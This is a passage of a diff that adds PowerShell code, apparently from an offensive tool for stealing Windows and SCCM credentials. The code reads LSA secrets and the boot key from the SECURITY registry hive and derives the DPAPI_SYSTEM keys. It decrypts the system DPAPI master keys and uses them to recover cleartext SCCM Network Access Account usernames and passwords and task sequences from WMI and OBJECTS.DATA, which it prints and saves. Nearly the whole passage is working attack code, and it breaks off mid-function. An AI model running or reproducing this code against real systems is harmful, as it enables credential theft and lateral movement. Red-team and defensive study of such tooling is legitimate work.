+    [System.Array]::Copy($Key, 0, $buffer, 0, $Key.Length)
+
+    for ($i = 0; $i -lt 1000; $i++)
+    {
+        $dest = $Key.Length + ($i * $RawData.Length)
+        [System.Array]::Copy($RawData, 0, $buffer, $dest, $RawData.Length)
+    }
+
+    $sha256 = [System.Security.Cryptography.SHA256]::Create()
+    
+    try
+    { 
+        return $sha256.ComputeHash($buffer) 
+    }
+    
+    finally
+    { 
+        $sha256.Dispose()
+    }
+}
+
+function Get-LsaAesDecrypt {
+    param ([byte[]] $Key,[byte[]] $Data)
+
+    # Decrypts AES-CBC encrypted data using a provided key and zero IV. Handles data in 16-byte chunks.
+    # Hand-off: Returns decrypted data to Get-LSAKey/Get-LSASecret for LSA secret extraction.
+
+    $aes = [System.Security.Cryptography.AesManaged]::new()
+    try 
+    {
+        $aes.Key       = $Key
+        $aes.IV        = New-Object byte[] 16
+        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.BlockSize = 128
+        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::Zeros
+
+        $transform     = $aes.CreateDecryptor()
+        $chunks        = [int][math]::Ceiling($Data.Length / 16)
+        $plaintext     = New-Object byte[] ($chunks * 16)
+
+        for ($i = 0; $i -lt $chunks; $i++) 
+        {
+            $offset        = $i * 16
+            $chunk         = New-Object byte[] 16
+            [System.Array]::Copy($Data, $offset, $chunk, 0, 16)
+            $decryptedChunk = $transform.TransformFinalBlock($chunk, 0, 16)
+            [System.Array]::Copy($decryptedChunk, 0, $plaintext, $offset, 16)
+        }
+
+        return $plaintext
+    }
+    
+    finally 
+    {
+        $transform.Dispose()
+        $aes.Dispose()
+    }
+}
+
+function Get-LSAKey {
+
+    # Derives the LSA encryption key using the boot key and encrypted registry data from SECURITY hive.
+    # Hand-off: Uses Get-BootKey, passes data to Get-LsaSha256Hash/Get-LsaAesDecrypt. Returns LSA key to Get-LSASecret.
+
+    $BootKey                      = Get-BootKey
+    $LSAKeyEncryptedStruct        = Get-ItemPropertyValue -Path "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)"
+    $LSAEncryptedData             = $LSAKeyEncryptedStruct[28..($LSAKeyEncryptedStruct.Length - 1)]
+    $LSAEncryptedDataEncryptedKey = $LSAEncryptedData[0..31]
+    $tmpKey                       = Get-LsaSha256Hash -Key $BootKey -RawData $LSAEncryptedDataEncryptedKey
+    $LSAEncryptedDataRemainder    = $LSAEncryptedData[32..($LSAEncryptedData.Length - 1)]
+    $LSAKeyStructPlaintext        = Get-LsaAesDecrypt -Key $tmpKey -Data $LSAEncryptedDataRemainder
+    $LSAKey                       = New-Object byte[] 32
+    [System.Array]::Copy($LSAKeyStructPlaintext, 68, $LSAKey, 0, 32)
+
+    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }
+    Write-Host "[*] BootKey : $(ToHex $BootKey)"
+    Write-Host "[*] tmpKey  : $(ToHex $tmpKey)"
+    Write-Host "[*] LSA Key : $(ToHex $LSAKey)"
+
+    return $LSAKey
+}
+
+function Get-LSASecret {
+    param ([string] $SecretName)
+
+    # Retrieves and decrypts a specified LSA secret from the registry using the LSA key.
+    # Hand-off: Uses Get-LSAKey, passes data to Get-LsaSha256Hash/Get-LsaAesDecrypt. Returns DPAPI_SYSTEM secret to Get-DPAPIKeys.
+
+    $LSAKey       = Get-LSAKey
+    $RegistryPath = "HKLM:\SECURITY\Policy\Secrets\$SecretName\CurrVal"
+
+    try 
+    {
+        $RegistryKey = Get-Item -Path $RegistryPath -ErrorAction Stop
+        $KeyData     = $RegistryKey.GetValue("")
+
+        if (-not $KeyData -or $KeyData.Length -lt 28)
+        {
+            Write-Warning "Invalid registry data for $SecretName"
+            return $null
+        }
+
+        $keyEncryptedData             = $keyData[28..($keyData.Length-1)]
+        $keyEncryptedDataEncryptedKey = $keyEncryptedData[0..31]
+        $tmpKey                       = Get-LSASHA256Hash -Key $LSAKey -RawData $keyEncryptedDataEncryptedKey
+        $keyEncryptedDataRemainder    = $keyEncryptedData[32..($keyEncryptedData.Length-1)]
+        $keyPathPlaintext             = Get-LsaAesDecrypt -Key $tmpKey -Data $keyEncryptedDataRemainder
+
+        if ($SecretName -eq "DPAPI_SYSTEM") 
+        {
+            return $keyPathPlaintext[20..59]
+        }
+
+        Write-Warning "LSA Secret '$SecretName' not implemented"
+        return $null
+    }
+    
+    catch 
+    {
+        Write-Warning "Error accessing registry: $_"
+        return $null
+    }
+}
+
+function Get-DPAPIKeys {
+
+    # Extracts machine and user DPAPI keys from the decrypted DPAPI_SYSTEM secret.
+    # Hand-off: Uses Get-LSASecret. Stores keys in script variables for later use by Triage-SystemMasterKeys.
+
+    $dpapiKeyFull                 = Get-LSASecret -SecretName "DPAPI_SYSTEM"
+    $script:dpapiMachineKeysBytes = New-Object byte[] 20
+    $script:dpapiUserKeysBytes    = New-Object byte[] 20
+
+    [System.Array]::Copy($dpapiKeyFull,  0, $script:dpapiMachineKeysBytes, 0, 20)
+    [System.Array]::Copy($dpapiKeyFull, 20, $script:dpapiUserKeysBytes   , 0, 20)
+
+    function ToHex($bytes) { ($bytes | ForEach-Object { $_.ToString("X2") }) -join '' }
+
+    Write-Host ""
+    Write-Host "[*] Secret  : DPAPI_SYSTEM"
+    Write-Host "[*] Full    : $(( $dpapiKeyFull                 | ForEach-Object { $_.ToString('X2') } ) -join '')"
+    Write-Host "[*] Machine : $(( $script:dpapiMachineKeysBytes | ForEach-Object { $_.ToString('X2') } ) -join '')"
+    Write-Host "[*] User    : $(( $script:dpapiUserKeysBytes    | ForEach-Object { $_.ToString('X2') } ) -join '')"
+    Write-Host ""
+}
+
+function Get-MasterKey {
+    param ([byte[]] $masterKeyBytes)
+
+    # Extracts and validates the master key length from DPAPI master key bytes.
+    # Hand-off: Called by Decrypt-MasterKeyWithSha to process master key structures.
+
+    $offset           = 96
+    $masterKeyLength  = [System.BitConverter]::ToInt64($masterKeyBytes, $offset)
+    $offset          += 4 * 8
+
+    if ($masterKeyLength -lt 0 -or $masterKeyLength -gt 1048576)
+    {
+        return "[!] MasterKeyLength value $masterKeyLength is invalid or suspicious"
+    }
+
+    $masterKeySubBytes = New-Object byte[] ([int]$masterKeyLength)
+    [System.Array]::Copy($masterKeyBytes, $offset, $masterKeySubBytes, 0, [int]$masterKeyLength)
+    return $masterKeySubBytes
+}
+
+function Derive-PreKey {
+    param ([byte[]] $shaBytes, [uint32] $algHash, [byte[]] $salt, [int] $rounds)
+
+    # Derives a pre-key using PBKDF2 with HMAC-SHA1/SHA512 for DPAPI master key decryption.
+    # Hand-off: Returns derived key to Decrypt-MasterKeyWithSha for decryption operations.
+
+    switch ($algHash)
+    {
+        32782
+        {
+            $hmac = [System.Security.Cryptography.HMACSHA512]::new()
+            $df   = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
+            $derivedPreKey = $df.GetBytes(48, "sha512")
+            break
+        }
+        32777
+        {
+            $hmac = [System.Security.Cryptography.HMACSHA1]::new()
+            $df   = [Pbkdf2]::new($hmac, $shaBytes, $salt, $rounds)
+            $derivedPreKey = $df.GetBytes(32, "sha1")
+            break
+        }
+        default
+        {
+            throw "Unsupported algHash: $algHash"
+        }
+    }
+
+    return $derivedPreKey
+}
+
+
+
+
+function Decrypt-Aes256HmacSha512 {
+    param ([byte[]] $ShaBytes, [byte[]] $Final, [byte[]] $EncData)
+
+    # Decrypts AES-256-CBC data with HMAC-SHA512 integrity check. Used for newer DPAPI master keys.
+    # Hand-off: Returns SHA1 of decrypted master key to Decrypt-MasterKeyWithSha.
+
+    # Key and IV setup
+    $HMACLen    = [System.Security.Cryptography.HMACSHA512]::new().HashSize / 8
+    $IVBytes    = New-Object byte[] 16
+    $key        = New-Object byte[] 32
+    [Array]::Copy($Final, 32, $IVBytes, 0, 16)
+    [Array]::Copy($Final, 0, $key, 0, 32)
+
+    # AES Decrypt
+    $aes        = New-Object Security.Cryptography.AesManaged
+    $aes.Key    = $key
+    $aes.IV     = $IVBytes
+    $aes.Mode   = [Security.Cryptography.CipherMode]::CBC
+    $aes.Padding= [Security.Cryptography.PaddingMode]::Zeros
+    $dec        = $aes.CreateDecryptor()
+    $plain      = $dec.TransformFinalBlock($EncData, 0, $EncData.Length)
+
+    # HMAC and SHA
+    $outLen     = $plain.Length
+    $outputLen  = $outLen - 16 - $HMACLen
+    $mkFull     = New-Object byte[] $HMACLen
+    [Array]::Copy($plain, $outLen - $outputLen, $mkFull, 0, $mkFull.Length)
+    $sha1       = [System.Security.Cryptography.SHA1Managed]::Create()
+    $mkSha1     = $sha1.ComputeHash($mkFull)
+
+    $cryptBuf   = New-Object byte[] 16
+    [Array]::Copy($plain, $cryptBuf, 16)
+    $hmac1      = [System.Security.Cryptography.HMACSHA512]::new($ShaBytes)
+    $r1Hmac     = $hmac1.ComputeHash($cryptBuf)
+
+    $r2Buf      = New-Object byte[] $outputLen
+    [Array]::Copy($plain, $outLen - $outputLen, $r2Buf, 0, $outputLen)
+    $hmac2      = [System.Security.Cryptography.HMACSHA512]::new($r1Hmac)
+    $r2Hmac     = $hmac2.ComputeHash($r2Buf)
+
+    $cmp        = New-Object byte[] 64
+    [Array]::Copy($plain, 16, $cmp, 0, $cmp.Length)
+
+    if (-not [System.Linq.Enumerable]::SequenceEqual($cmp, $r2Hmac))
+    {
+        throw "HMAC integrity check failed!"
+    }
+
+    return $mkSha1
+}
+
+
+
+function Decrypt-TripleDESHmac {
+    param ([byte[]] $Final, [byte[]] $EncData)
+
+    # Decrypts 3DES data with custom HMAC handling. Used for older DPAPI master keys.
+    # Hand-off: Returns SHA1 of decrypted master key to Decrypt-MasterKeyWithSha.
+
+    $ivBytes    = New-Object byte[] 8
+    $key        = New-Object byte[] 24
+    [Array]::Copy($Final, 24, $ivBytes, 0, 8)
+    [Array]::Copy($Final, 0, $key, 0, 24)
+
+    $des        = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
+    $des.Key    = $key
+    $des.IV     = $ivBytes
+    $des.Mode   = [Security.Cryptography.CipherMode]::CBC
+    $des.Padding= [Security.Cryptography.PaddingMode]::Zeros
+
+    $decryptor      = $des.CreateDecryptor()
+    $plaintextBytes = $decryptor.TransformFinalBlock($EncData, 0, $EncData.Length)
+
+    $decryptedKey   = New-Object byte[] 64
+    [Array]::Copy($plaintextBytes, 40, $decryptedKey, 0, 64)
+
+    $sha1           = New-Object Security.Cryptography.SHA1Managed
+    $masterKeySha1  = $sha1.ComputeHash($decryptedKey)
+
+    return $masterKeySha1
+}
+
+function Decrypt-MasterKeyWithSha {
+    param ([byte[]] $MasterKeyBytes,[byte[]] $SHABytes)
+
+    # Orchestrates DPAPI master key decryption using derived keys and algorithm-specific functions.
+    # Hand-off: Calls Derive-PreKey and algorithm-specific decryptors. Returns GUID:key mapping to Triage-SystemMasterKeys.
+
+    $guid       = '{' + [System.Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72) + '}'
+    $mkBytes    = Get-MasterKey $MasterKeyBytes
+
+    $offset     = 4
+    $salt       = New-Object byte[] 16
+    [Array]::Copy($mkBytes, $offset, $salt, 0, 16)
+    $offset    += 16
+
+    $rounds     = [BitConverter]::ToInt32($mkBytes, $offset)
+    $offset    += 4
+
+    $algHash    = [BitConverter]::ToUInt32($mkBytes, $offset)
+    $offset    += 4
+
+    $algCrypt   = [BitConverter]::ToUInt32($mkBytes, $offset)
+    $offset    += 4
+
+    $encData    = New-Object byte[] ($mkBytes.Length - $offset)
+    [Array]::Copy($mkBytes, $offset, $encData, 0, $encData.Length)
+
+    $derivedPreKey = Derive-PreKey -shaBytes $SHABytes -algHash $algHash -salt $salt -rounds $rounds
+
+    if ($algCrypt -eq 26128 -and $algHash -eq 32782)
+    {
+        
+        # CALG_AES_256 with CALG_SHA_512
+        $masterKeySha1 = Decrypt-Aes256HmacSha512 -ShaBytes $shaBytes -Final $derivedPreKey -EncData $encData
+        $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
+        return @{ $guid = $masterKeyStr }
+    }
+    
+    elseif ($algCrypt -eq 26115 -and ($algHash -eq 32777 -or $algHash -eq 32772)) 
+    {
+        
+        # CALG_3DES with CALG_HMAC or CALG_SHA1
+        $masterKeySha1 = Decrypt-TripleDESHmac -Final $derivedPreKey -EncData $encData
+        $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
+        return @{ $guid = $masterKeyStr }
+    }
+    
+    else 
+    {
+        throw "Alg crypt '$algCrypt / 0x{0:X8}' not currently supported!" -f $algCrypt
+    }
+}
+
+
+
+function Describe-DPAPIBlob {
+    param ([byte[]]$blobBytes, [hashtable] $MasterKeys,[string] $blobType = "blob",[bool] $unprotect = $false, [byte[]] $entropy = $null)
+
+    # Parses and decrypts DPAPI blobs (credentials, RDG files, etc.) using provided master keys.
+    # Hand-off: Uses MasterKeys hashtable. Returns decrypted data to Decrypt-NAA.
+
+    $offset = 0
+    
+    if ($blobType -eq "credential")
+    { 
+        $offset = 36
+    }
+    
+    elseif ($blobType -in @("policy","blob","rdg","chrome","keepass"))
+    { 
+        $offset = 24
+    }
+    
+    else 
+    {
+        Write-Host "[!] Unsupported blob type: $blobType"
+        return ,@()
+    }
+
+    $guidMasterKey = [Guid]::new([byte[]]$blobBytes[$offset..($offset+15)])
+    $guidString    = "{$guidMasterKey}"
+    $offset       += 16
+
+    if ($blobType -notin "rdg","chrome")
+    {
+        Write-Host "    guidMasterKey    : $guidString"
+        Write-Host "    size             : $($blobBytes.Length)"
+    }
+
+    $flags    = [BitConverter]::ToUInt32($blobBytes, $offset)
+    $offset  += 4
+    
+    if ($blobType -notin "rdg","chrome")
+    {
+        $flagInfo = "0x$($flags.ToString('X8'))"
+        
+        if ($flags -eq 0x20000000)
+        { 
+            $flagInfo += " (CRYPTPROTECT_SYSTEM)"
+        }
+        
+        Write-Host "    flags            : $flagInfo"
+    }
+
+    $descLength   = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4
+    $description  = [System.Text.Encoding]::Unicode.GetString($blobBytes, $offset, $descLength)
+    $offset      += $descLength
+
+    $algCrypt     = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4
+    $algCryptLen  = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4
+    $saltLen      = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4
+    $saltBytes    = $blobBytes[$offset..($offset+$saltLen-1)]
+    $offset      += $saltLen
+
+    $hmacKeyLen   = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4 + $hmacKeyLen
+    $algHash      = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4
+
+    if ($blobType -notin "rdg","chrome")
+    {
+        Write-Host "    algHash/algCrypt : $algHash ($([CryptAlg]$algHash)) / $algCrypt ($([CryptAlg]$algCrypt))"
+        Write-Host "    description      : $description"
+    }
+
+    $algHashLen   = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4
+    $hmac2KeyLen  = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4 + $hmac2KeyLen
+
+    $dataLen      = [BitConverter]::ToInt32($blobBytes, $offset)
+    $offset      += 4
+    $dataBytes    = $blobBytes[$offset..($offset+$dataLen-1)]
+
+    if ($unprotect -and $blobType -in "blob","rdg","chrome","keepass")
+    {
+        try
+        {
+            return [System.Security.Cryptography.ProtectedData]::Unprotect($blobBytes,$entropy,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        }
+        
+        catch
+        {
+            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
+        }
+    }
+
+    if ($MasterKeys.ContainsKey($guidString))
+    {
+        $keyBytes = [System.Collections.Generic.List[byte]]::new()
+        
+        for ($i = 0; $i -lt $MasterKeys[$guidString].Length; $i += 2)
+        {
+            $keyBytes.Add([Convert]::ToByte($MasterKeys[$guidString].Substring($i, 2), 16))
+        }
+        
+        $keyBytes = $keyBytes.ToArray()
+
+        try 
+        {
+            $hmac = $null
+            
+            if($algHash -eq 32772)
+            { 
+                $hmac = [System.Security.Cryptography.HMACSHA1]::new($keyBytes)
+            }
+            
+            elseif ($algHash -eq 32782)
+            { 
+                $hmac = [System.Security.Cryptography.HMACSHA512]::new($keyBytes)
+            }
+            
+            else 
+            {
+                Write-Host "    [!] Unsupported hash algorithm: $algHash"
+                return ,@()
+            }
+
+            $inputBytes      = $saltBytes
+            
+            if ($entropy)
+            { 
+                $inputBytes += $entropy
+            }
+            
+            $derivedKeyBytes = $hmac.ComputeHash($inputBytes)
+            $hmac.Dispose()
+
+            $keySize         = $algCryptLen / 8
+            $finalKeyBytes   = $derivedKeyBytes[0..($keySize-1)]
+
+            $padding         = if ($blobType -eq "credential") { "PKCS7" } else { "None" }
+            $decrypted       = Decrypt-Blob -ciphertext $dataBytes -key $finalKeyBytes -algId $algCrypt
+
+            if ($blobType -eq "credential")
+            {
+                # I dont think we are missing anything by redacting this. Its produces alot of garbage around the data anyway. Should loop back to this later
+                #$decText = [System.Text.Encoding]::Unicode.GetString($decrypted)
+                #Write-Host "    dec(blob)        : $decText"
+            }
+
+            return $decrypted
+        }
+        
+        catch
+        {
+            Write-Host "    [X] Error during decryption: $_"
+        }
+    }
+    
+    else
+    {
+        if ($blobType -in "rdg","chrome")
+        {
+            return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
+        }
+        
+        else
+        {
+            Write-Host "    [!] MasterKey GUID not in cache: $guidString"
+        }
+    }
+
+    return ,@()
+}
+
+function Decrypt-Blob {
+    param ([byte[]] $ciphertext, [byte[]] $key,[int] $algId)
+    
+    # Decrypts ciphertext using 3DES or AES-256 based on algorithm ID. Helper for Describe-DPAPIBlob.
+    # Hand-off: Returns plaintext to Describe-DPAPIBlob.
+
+    switch ($algId) {
+        26115 {  # CALG_3DES
+            $ivBytes    = New-Object byte[] 8
+            $des        = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
+            $des.Key    = $key
+            $des.IV     = $ivBytes
+            $des.Mode   = [System.Security.Cryptography.CipherMode]::CBC
+            $des.Padding= [System.Security.Cryptography.PaddingMode]::Zeros
+
+            try
+            {
+                $decryptor = $des.CreateDecryptor()
+                return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+            }
+            
+            catch
+            {
+                Write-Warning "3DES decryption failed: $_"
+                return $null
+            }
+            
+            finally
+            {
+                
+                if ($des)
+                { 
+                    $des.Dispose()
+                }
+            }
+        }
+        
+        26128 {  # CALG_AES_256
+            $ivBytes    = New-Object byte[] 16
+            $aes        = New-Object System.Security.Cryptography.AesManaged
+            $aes.Key    = $key
+            $aes.IV     = $ivBytes
+            $aes.Mode   = [System.Security.Cryptography.CipherMode]::CBC
+            $aes.Padding= [System.Security.Cryptography.PaddingMode]::Zeros
+
+            try
+            {
+                $decryptor = $aes.CreateDecryptor()
+                return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
+            }
+            catch
+            {
+                Write-Warning "AES decryption failed: $_"
+                return $null
+            }
+            
+            finally
+            {
+                if ($aes)
+                { 
+                    $aes.Dispose()
+                }
+            }
+        }
+        
+        default 
+        {
+            return "[!] Unsupported algorithm: $algId"
+        }
+    }
+}
+
+enum CryptAlg {
+    CALG_SHA1     = 32772
+    CALG_SHA_512  = 32782
+    CALG_AES_256  = 26128
+    CALG_3DES     = 26115
+}
+
+
+function Is-Unicode {
+    param ([byte[]] $bytes)
+
+     # Helper that checks if byte array contains Unicode data. Used during blob decryption analysis.
+
+    if ($bytes.Length -lt 2)
+    {
+        return $false
+    }
+
+    # Check for UTF-16 LE/BE BOM or even-length characteristic
+    return (
+        ($bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) -or  # UTF-16 LE BOM
+        ($bytes[0] -eq 0xFE -and $bytes[1] -eq 0xFF) -or  # UTF-16 BE BOM
+        ($bytes.Length % 2 -eq 0)                         # Even-length data
+    )
+}
+
+function Decrypt-NAA {
+    param ([string] $Blob, [hashtable] $MasterKeys)
+
+    # Decrypts Network Access Account (NAA) credential blobs from SCCM using DPAPI master keys.
+    # Hand-off: Uses Describe-DPAPIBlob. Returns cleartext to Decrypt-LocalNetworkAccessAccountsWmi.
+
+    $size               = [int]($Blob.Length / 2)
+    [byte[]] $blobBytes = New-Object byte[] $size
+
+    for ($i = 0; $i -lt $Blob.Length; $i += 2)
+    {
+        $blobBytes[$i / 2] = [Convert]::ToByte($Blob.Substring($i, 2), 16)
+    }
+
+    $offset          = 4
+    $size2           = [int]($Blob.Length / 2)
+    [byte[]] $unmanagedArray = New-Object byte[] $size2
+    [System.Buffer]::BlockCopy($blobBytes, 4, $unmanagedArray, 0, $blobBytes.Length - $offset)
+    $blobBytes       = $unmanagedArray
+
+    if ($blobBytes.Length -gt 0)
+    {
+        [byte[]] $decBytesRaw = Describe-DPAPIBlob $blobBytes $MasterKeys
+
+        if ($decBytesRaw -ne $null -and $decBytesRaw.Length -ne 0)
+        {
+            if (Is-Unicode $decBytesRaw)
+            {
+                $finalIndex = [Array]::LastIndexOf($decBytesRaw, [byte]0)
+                
+                if ($finalIndex -gt 1)
+                {
+                    $decBytes = New-Object byte[] ($finalIndex + 1)
+                    [System.Array]::Copy($decBytesRaw, 0, $decBytes, 0, $finalIndex)
+                    $data = [System.Text.Encoding]::Unicode.GetString($decBytes)
+
+                  # Write-Host "    dec(blob)        : $data"
+                    
+                    return $data
+                }
+                
+                else
+                {
+                    $data = [System.Text.Encoding]::ASCII.GetString($decBytesRaw)
+                    if ($TaskSequence){ return $data }
+                  
+                  # Write-Host "    dec(blob)        : $data"
+                    
+                    return $data
+                }
+            }
+            
+            else
+            {
+                $hexData = ($decBytesRaw | ForEach-Object { $_.ToString("X2") }) -join " "
+              
+              # Write-Host "    dec(blob)        : $hexData"
+                
+                return $hexData
+            }
+        }
+        
+        else
+        {
+            return $null
+        }
+    }
+    
+    else
+    {
+        return $null
+    }
+}
+
+
+function Triage-SystemMasterKeys {
+
+    # Recursively searches for DPAPI master keys on disk and decrypts them using system DPAPI keys.
+    # Hand-off: Uses Get-DPAPIKeys, Decrypt-MasterKeyWithSha. Returns GUID:key mapping to decryption functions.
+
+    if ($global:mappings -and $global:mappings.Count -gt 0)
+    {
+        return $global:mappings
+    }
+
+    $global:mappings = @{}
+    $dpapiKeys       = Get-DPAPIKeys
+
+    $rootPath = "$env:SystemRoot\System32\Microsoft\Protect\"
+
+    Get-ChildItem -Path $rootPath -Recurse -Force | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
+        
+        if ([Regex]::IsMatch($_.Name, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$"))
+        {
+            try
+            {
+                $masterKeyBytes  = [IO.File]::ReadAllBytes($_.FullName)
+                $parentDir       = $_.Directory.Name
+                $grandParentDir  = $_.Directory.Parent.Name
+
+                if     ($parentDir -eq 'User')           { $shaBytes = $dpapiUserKeysBytes    }
+                elseif ($parentDir -eq 'Machine')        { $shaBytes = $dpapiMachineKeysBytes }
+                elseif ($grandParentDir -like 'S-1-5-*') { $shaBytes = $dpapiUserKeysBytes    }
+                else                                     { $shaBytes = $dpapiMachineKeysBytes }
+
+                $plainTextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -SHABytes $shaBytes
+
+                foreach ($key in $plainTextMasterKey.Keys)
+                {
+                    $global:mappings[$key] = $plainTextMasterKey[$key]
+                }
+            }
+            
+            catch
+            {
+                Write-Host "[!] Error triaging $($_.FullName): $($_.Exception.Message)"
+            }
+        }
+    }
+
+    Write-Host "[*] SYSTEM master key cache:"
+    
+    foreach ($key in $global:mappings.Keys)
+    {
+        Write-Host "$key`:$($global:mappings[$key])"
+    }
+    
+    Write-Host "`n`n"
+
+    return $global:mappings
+}
+
+function Decrypt-LocalNetworkAccessAccountsWmi {
+    param ([System.Collections.IEnumerable] $NetworkAccessAccounts, [hashtable] $MasterKeys)
+
+    # Decrypts SCCM Network Access Account credentials retrieved via WMI.
+    # Hand-off: Uses Triage-SystemMasterKeys and Decrypt-NAA. Outputs credentials to console.
+
+    Write-Host "[+] Decrypting network access account credentials`n"
+
+    foreach ($account in $NetworkAccessAccounts)
+    {
+        try
+        {
+            $protectedUsername = ($account.NetworkAccessUsername -split '\[')[2] -split '\]' | Select-Object -First 1
+            $protectedPassword = ($account.NetworkAccessPassword -split '\[')[2] -split '\]' | Select-Object -First 1
+
+            $username = Decrypt-NAA -Blob $protectedUsername -MasterKeys $MasterKeys
+            $password = Decrypt-NAA -Blob $protectedPassword -MasterKeys $MasterKeys
+
+            if ($username -like "00 00 0E 0E 0E*" -or $password -like "00 00 0E 0E 0E*")
+            {
+                Write-Host "[!] SCCM is configured to use the client's machine account instead of NAA`n"
+            }
+            
+            else
+            {
+                Write-Host "`n"
+                
+                Write-Host "    Network Access Username: $username"
+                Write-Host "    Network Access Password: $password"
+                
+                Write-Host "`n"
+            }
+        }
+        
+        catch
+        {
+            Write-Host "[!] Error decrypting NAA credentials: $_"
+        }
+    }
+}
+
+
+
+function Format-XML {
+    param ([xml]$xml, [int]$indent = 2)
+
+    $StringWriter = New-Object System.IO.StringWriter
+    $XmlWriter = New-Object System.Xml.XmlTextWriter $StringWriter
+    $XmlWriter.Formatting = "indented"
+    $XmlWriter.Indentation = $indent
+    $xml.WriteContentTo($XmlWriter)
+    $XmlWriter.Flush()
+    $StringWriter.Flush()
+    return $StringWriter.ToString()
+}
+
+function Decrypt-LocalTaskSequencesWMI {
+    param ([array] $TaskSequences, [hashtable] $MasterKeys)
+
+    Write-Host "[+] Decrypting Task Sequences`n"
+
+    foreach ($taskSequence in $TaskSequences)
+    {
+        try
+        {
+            if ($taskSequence.TS_Sequence -match "<!\[CDATA\[([0-9A-F\s]+)\]\]>")
+            {
+                $hexData   = $matches[1] -replace '\s', ''
+                $plaintext = Decrypt-NAA -Blob $hexData -MasterKeys $MasterKeys
+
+                if ($plaintext -is [byte[]])
+                {
+                    $plaintext = [System.Text.Encoding]::UTF8.GetString($plaintext)
+                }
+
+                Write-Host "`n"
+                Write-Host "[+]    Task Sequence: "
+                Write-Host "`n"
+
+                $xmlMatch = Select-String -InputObject $plaintext -Pattern "<sequence[^>]*?>.*?</sequence>" -AllMatches
+                $xmlPrinted = $false
+
+                if ($xmlMatch.Matches.Count -gt 0)
+                {
+                    foreach ($match in $xmlMatch.Matches)
+                    {
+                        try
+                        {
+                            $sequenceXml = [xml]$match.Value
+                            Format-XML $sequenceXml | Write-Host -ForegroundColor Gray
+                            $xmlPrinted = $true
+                            Write-Host
+                            
+                            if ($global:NoSave)
+                            {
+                                continue
+                            }
+                            
+                            $timestamp = Get-Date -Format "yyyy"
+                            $Random = Get-Random -Minimum 1 -Maximum 10000
+                            $cleanName = $taskSequence.Name -replace '[^\w\s-]', ''
+                            $fileName = "TaskSequence_${cleanName}_${timestamp}_${Random}.xml"
+                            
+                            Start-Sleep -Milliseconds 10
+                            $sequenceXml.Save((Join-Path -Path $pwd -ChildPath $fileName))
+                            
+                            Write-Host "`n"
+                            Write-Host "[+]    Saved XML to: $fileName"
+                        }
+                        
+                        catch
+                        {
+                            Write-Host "    [!] Extracted content is not valid XML"
+                        }
+                    }
+                }
+
+                if (-not $xmlPrinted)
+                {
+                    Write-Host "    Decrypted Value: $plaintext"
+                }
+                
+                Write-Host "`n"
+            }
+            
+            else
+            {
+                Write-Host "[!] No CDATA found in Task Sequence: $($taskSequence.Name)" -ForegroundColor "Yellow"
+            }
+        }
+        
+        catch
+        {
+            Write-Host "[!] Error decrypting Task Sequence '$($taskSequence.Name)': $_" -ForegroundColor "Yellow"
+        }
+    }
+}
+
+
+
+function Triage-SccmWMI {
+    param ([hashtable]$MasterKeys)
+
+    # Main orchestrator for SCCM secret decryption via WMI. Retrieves NAA/Task Sequences and triggers decryption.
+    # Hand-off: Calls Triage-SystemMasterKeys, Decrypt-LocalNetworkAccessAccountsWmi, and Decrypt-LocalTaskSequencesWMI.
+
+    $naa        = @(Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class CCM_NetworkAccessAccount -ErrorAction SilentlyContinue)
+    $tasks      = @(Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class CCM_TaskSequence         -ErrorAction SilentlyContinue)
+
+    if ($naa.Count -gt 0)
+    {
+        Write-Host "[+] Found $($naa.Count) Network Access Account(s)"
+        Decrypt-LocalNetworkAccessAccountsWmi -NetworkAccessAccounts $naa -MasterKeys $MasterKeys
+    }
+    
+    else
+    {
+        Write-Host "[!] No Network Access Accounts found"
+    }
+
+    if ($tasks.Count -gt 0)
+    {
+        Write-Host "[+] Found $($tasks.Count) Task Sequence(s)"
+        Decrypt-LocalTaskSequencesWMI -TaskSequences $tasks -MasterKeys $MasterKeys
+    }
+    
+    else
+    {
+        Write-Host "[!] No Task Sequences found"
+    }
+}
+
+function Triage-SccmDisk {
+    param ([hashtable] $Masterkeys)
+
+    # Reads and parses the CIM repository OBJECTS.DATA file for SCCM policy secrets,
+    # matches secret types using regex, and attempts DPAPI decryption using discovered master keys.
+    # Outputs each decrypted secret type in a readable format.
+
+    # Determine OBJECTS.DATA path based on architecture
+    $Path = "$env:SystemDrive\Windows\Sysnative\Wbem\Repository\OBJECTS.DATA"
+    if (-not [System.IO.File]::Exists($Path))
+    {
+        $Path = "$env:SystemDrive\Windows\System32\Wbem\Repository\OBJECTS.DATA"
+    }
+
+    if ([System.IO.File]::Exists($Path))
+    {
